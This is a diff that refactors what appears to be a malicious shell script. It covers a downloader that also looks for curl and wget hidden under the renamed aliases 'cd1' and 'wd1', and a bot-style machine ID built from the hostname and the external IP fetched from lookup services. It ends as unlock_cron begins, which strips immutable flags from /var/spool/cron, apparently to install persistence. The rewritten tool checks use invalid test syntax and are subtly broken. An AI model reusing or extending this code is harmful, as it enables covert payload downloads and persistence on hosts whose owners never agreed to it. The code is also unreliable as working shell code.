@@ -404,33 +404,26 @@ downloads() {
     local dest="$2"
     local backup_url="$3"
 
-    local cmd=""
-    if command -v cd1 >/dev/null 2>&1; then cmd="cd1"
-    elif command -v curl >/dev/null 2>&1; then cmd="curl"
-    elif command -v wd1 >/dev/null 2>&1; then cmd="wd1"
-    elif command -v wget >/dev/null 2>&1; then cmd="wget"
-    elif command -v python3 >/dev/null 2>&1; then cmd="python3"
-    else
-        echo "Error: Neither curl, wget, nor python3 is available." >&2
-        return 1
-    fi
-
     _do_download() {
         local target_url="$1"
-        
         if [ -z "$target_url" ]; then
-            echo "Error: target_url is empty." >&2
             return 1
         fi
 
-        rm -f "$dest" 
+        rm -f "$dest"
 
-        if [ "$cmd" = "curl" ] || [ "$cmd" = "cd1" ]; then
-            $cmd --connect-timeout 30 --retry 3 -sSL "$target_url" -o "$dest"
-        elif [ "$cmd" = "wget" ] || [ "$cmd" = "wd1" ]; then
-            $cmd --timeout=30 --tries=3 -q -O "$dest" "$target_url"
-        elif [ "$cmd" = "python3" ]; then
+        if command -v curl >/dev/null 2>&1 || command -v cd1 >/dev/null 2>&1; then
+            local c="curl"
+            command -v cd1 >/dev/null 2>&1 && [ ! command -v curl >/dev/null 2>&1 ] && c="cd1"
+            $c --connect-timeout 30 --retry 3 -sSL "$target_url" -o "$dest"
+        elif command -v wget >/dev/null 2>&1 || command -v wd1 >/dev/null 2>&1; then
+            local w="wget"
+            command -v wd1 >/dev/null 2>&1 && [ ! command -v wget >/dev/null 2>&1 ] && w="wd1"
+            $w --timeout=30 --tries=3 -q -O "$dest" "$target_url"
+        elif command -v python3 >/dev/null 2>&1; then
             python3 -c "import urllib.request; urllib.request.urlretrieve('$target_url', '$dest')"
+        else
+            return 1
         fi
 
         [ -s "$dest" ]
@@ -451,9 +444,9 @@ downloads() {
 }
 
 generate_machine_id() {
-    hostname_raw=""
-    hostname_short=""
-    external_ip=""
+    local hostname_raw=""
+    local hostname_short=""
+    local external_ip=""
 
     hostname_raw=$( (hostname -s 2>/dev/null || hostname 2>/dev/null) || echo "UNKNOWN" )
     hostname_short="${hostname_raw%%.*}"
@@ -461,14 +454,11 @@ generate_machine_id() {
 
     providers="http://ifconfig.me http://icanhazip.com http://ipinfo.io/ip"
 
-    if [ -x "/usr/bin/curl" ] || [ -x "/usr/bin/cd1" ] || command -v curl >/dev/null 2>&1 || command -v cd1 >/dev/null 2>&1; then
-        cmd="curl"
-        if [ -x "/usr/bin/cd1" ] || command -v cd1 >/dev/null 2>&1; then
-            [ ! -x "/usr/bin/curl" ] && [ -z "$(command -v curl 2>/dev/null)" ] && cmd="cd1"
-        fi
-
+    if command -v curl >/dev/null 2>&1 || command -v cd1 >/dev/null 2>&1; then
+        local c="curl"
+        command -v cd1 >/dev/null 2>&1 && [ ! command -v curl >/dev/null 2>&1 ] && c="cd1"
         for provider in $providers; do
-            external_ip=$($cmd -4 -s --max-time 2 "$provider" 2>/dev/null | tr -d '\r\n[:space:]')
+            external_ip=$($c -4 -s --max-time 2 "$provider" 2>/dev/null | tr -d '\r\n[:space:]')
             if echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
                 break
             fi
@@ -476,19 +466,14 @@ generate_machine_id() {
     fi
 
     if [ -z "$external_ip" ] || [ "$external_ip" = "NOIP" ]; then
-        if [ -x "/usr/bin/wget" ] || [ -x "/usr/bin/wd1" ] || command -v wget >/dev/null 2>&1 || command -v wd1 >/dev/null 2>&1; then
-            cmd="wget"
-            if [ -x "/usr/bin/wd1" ] || command -v wd1 >/dev/null 2>&1; then
-                [ ! -x "/usr/bin/wget" ] && [ -z "$(command -v wget 2>/dev/null)" ] && cmd="wd1"
-            fi
-
-            wget_opts="-qO-"
-            if $cmd --help 2>&1 | grep -q -- "-4"; then
-                wget_opts="-4 -qO-"
-            fi
+        if command -v wget >/dev/null 2>&1 || command -v wd1 >/dev/null 2>&1; then
+            local w="wget"
+            command -v wd1 >/dev/null 2>&1 && [ ! command -v wget >/dev/null 2>&1 ] && w="wd1"
+            local wget_opts="-qO-"
+            $w --help 2>&1 | grep -q -- "-4" && wget_opts="-4 -qO-"
 
             for provider in $providers; do
-                external_ip=$($cmd $wget_opts --timeout=2 "$provider" 2>/dev/null | tr -d '\r\n[:space:]')
+                external_ip=$($w $wget_opts --timeout=2 "$provider" 2>/dev/null | tr -d '\r\n[:space:]')
                 if echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
                     break
                 fi
@@ -500,7 +485,6 @@ generate_machine_id() {
         if command -v python3 >/dev/null 2>&1; then
             for provider in $providers; do
                 external_ip=$(python3 -c "import urllib.request; print(urllib.request.urlopen('$provider', timeout=2).read().decode('utf-8').strip())" 2>/dev/null | tr -d '\r\n[:space:]')
-
                 if echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
                     break
                 fi
@@ -514,6 +498,7 @@ generate_machine_id() {
 
     echo "${external_ip}_${hostname_short}"
 }
+
 unlock_cron()
 {
     chattr -R -ia /var/spool/cron
